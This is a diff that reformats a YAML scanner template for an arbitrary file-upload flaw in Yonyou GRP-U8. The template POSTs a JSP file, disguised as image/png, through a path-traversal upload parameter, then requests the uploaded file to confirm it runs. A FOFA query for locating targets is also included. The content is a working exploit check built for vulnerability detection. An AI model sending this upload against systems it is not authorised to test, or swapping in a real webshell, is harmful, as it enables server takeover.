@@ -1,41 +1,46 @@
-expression: r0() && r1()
 id: yongyou-grp-u8-uploadfiledata
+
 info:
+  name: 用友 GRP-U8 UploadFileData 任意文件上传
   author: zan8in
-  description: "\u7528\u53CB GRP-U8 UploadFileData\u63A5\u53E3\u5B58\u5728\u4EFB\u610F\
-    \u6587\u4EF6\u4E0A\u4F20\u6F0F\u6D1E\uFF0C\u653B\u51FB\u8005\u901A\u8FC7\u6F0F\
-    \u6D1E\u53EF\u4EE5\u83B7\u53D6\u670D\u52A1\u5668\u6743\u9650\nfofa: title=\"\u7528\
-    \u53CBGRP-U8\u884C\u653F\u4E8B\u4E1A\u5185\u63A7\u7BA1\u7406\u8F6F\u4EF6\"\n"
-  name: "\u7528\u53CB GRP-U8 UploadFileData \u4EFB\u610F\u6587\u4EF6\u4E0A\u4F20"
-  reference:
-  - https://mp.weixin.qq.com/s/DZXFxLC7fFKbPUWrdyITag
   severity: critical
   verified: true
+  description: |
+    用友 GRP-U8 UploadFileData接口存在任意文件上传漏洞，攻击者通过漏洞可以获取服务器权限
+    fofa: title="用友GRP-U8行政事业内控管理软件"
+  reference:
+    - https://mp.weixin.qq.com/s/DZXFxLC7fFKbPUWrdyITag
+
+set:
+  randstr: randomLowercase(5)
+  randbody: randomLowercase(28)
+  rboundary: randomLowercase(8)
 rules:
   r0:
-    expression: response.status == 200 && response.body.bcontains(b'parent.showSucceedMsg();')
-      && response.body.bcontains(b'parent.openWin.location.reload();')
     request:
-      body: "--WebKitFormBoundary{{rboundary}}\r\nContent-Disposition: form-data;\
-        \ name=\"file\"; filename=\"{{randstr}}.jsp\"\r\nContent-Type: image/png\r\
-        \n\r\n<% out.println(\"Hello yongyouU8 {{randbody}}\");%>\r\n--WebKitFormBoundary{{rboundary}}--\r\
-        \n"
-      headers:
-        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
-        Accept-Encoding: gzip, deflate
-        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
-        Connection: close
-        Content-Type: multipart/form-data; boundary=WebKitFormBoundary{{rboundary}}
-        DNT: 1
-        Upgrade-Insecure-Requests: 1
       method: POST
       path: /UploadFileData?action=upload_file&&foldername=/..&filename=/{{randstr}}.jsp
+      headers:
+        DNT: 1
+        Connection: close
+        Upgrade-Insecure-Requests: 1
+        Accept-Encoding: gzip
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Accept-Encoding: gzip, deflate
+        Content-Type: multipart/form-data; boundary=WebKitFormBoundary{{rboundary}}
+      body: "\
+        --WebKitFormBoundary{{rboundary}}\r\n\
+        Content-Disposition: form-data; name=\"file\"; filename=\"{{randstr}}.jsp\"\r\n\
+        Content-Type: image/png\r\n\
+        \r\n\
+        <% out.println(\"Hello yongyouU8 {{randbody}}\");%>\r\n\
+        --WebKitFormBoundary{{rboundary}}--\r\n\
+        "
+    expression: response.status == 200 && response.body.bcontains(b'parent.showSucceedMsg();') && response.body.bcontains(b'parent.openWin.location.reload();')
   r1:
-    expression: response.status == 200 && response.body.bcontains(bytes(randbody))
     request:
       method: GET
       path: /R9iPortal/{{randstr}}.jsp
-set:
-  randbody: randomLowercase(28)
-  randstr: randomLowercase(5)
-  rboundary: randomLowercase(8)
+    expression: response.status == 200 && response.body.bcontains(bytes(randbody))
+expression: r0() && r1()
